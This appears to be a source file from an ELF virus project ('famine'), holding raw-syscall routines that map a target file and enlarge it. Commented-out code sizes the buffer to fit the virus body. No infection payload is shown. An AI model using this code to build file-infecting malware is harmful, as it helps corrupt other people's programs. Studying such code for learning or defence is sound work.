#include "map.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include "famine.h"
#include "utils.h"

uint8_t	*map_file(const char *filename, size_t *size) {
	int		fd;
	uint8_t	*file;
	struct stat st;

	fd = _syscall(SYS_open, filename, O_RDONLY);

	if (_syscall(SYS_fstat, fd, &st) == -1) {
		_syscall(SYS_close, fd);
		return NULL;
	}

	file = (uint8_t *)_syscall(SYS_mmap, NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (file == MAP_FAILED) {
		_syscall(SYS_close, fd);
		return NULL;
	}

	_syscall(SYS_close, fd);

	*size = st.st_size;

	return file;
}

#define PAGE_SIZE 0x1000
//
//
//uint64_t get_bss_size(t_data *data) {
//	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)data->file;
//	Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)ehdr + ehdr->e_phoff);
//
//	size_t bss_len = 0;
//
//	for (size_t i = ehdr->e_phnum; i--;) {
//		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
//
//			bss_len = phdr[i].p_memsz - phdr[i].p_filesz;
//			break;
//		}
//	}
//
//	return bss_len;
//}
//
//int map_file(const char *filename, t_data *data) {
//	int		fd;
//	uint8_t	*file;
//	struct stat st;
//	char	buf[4096];
//
//	fd = _syscall(SYS_open, filename, O_RDONLY);
//
//	if (_syscall(SYS_fstat, fd, &st) == -1) {
//		_syscall(SYS_close, fd);
//		return -1;
//	}
//
//	//size_t size = (st.st_size / PAGE_SIZE + 1) * PAGE_SIZE;
//	//size_t size = (st.st_size + data->virus_size + PAGE_SIZE) & ~(PAGE_SIZE - 1);
//	//size_t size = (st.st_size + PAGE_SIZE) ;
//	size_t size = st.st_size + PAGE_SIZE + get_bss_size(data);
//
//	file = (uint8_t *)_syscall(SYS_mmap, NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
//	if (file == MAP_FAILED) {
//		_syscall(SYS_close, fd);
//		return -1;
//	}
//
//	void *ptr = file;
//
//	while (1) {
//		ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
//		if (ret <= 0)
//			break;
//		ft_memcpy(ptr, buf, ret);
//		ptr += ret;
//	}
//
//	_syscall(SYS_close, fd);
//
//	data->elf.size = st.st_size;
//	data->file = file;
//	data->size = size;
//	data->elf.mode = st.st_mode;
//
//	return 0;
//}

uint8_t	*expand_file(uint8_t *file, size_t size, size_t new_size, t_data *data) {
	uint8_t	*new_file;

	new_file = (uint8_t *)_syscall(SYS_mmap, NULL, new_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if (new_file == MAP_FAILED) {
		return NULL;
	}
	ft_memset(new_file, 0, new_size);
	ft_memcpy(new_file, file, size);


	_syscall(SYS_munmap, file, size);

	init_data(data, new_file, new_size);

	return new_file;
}
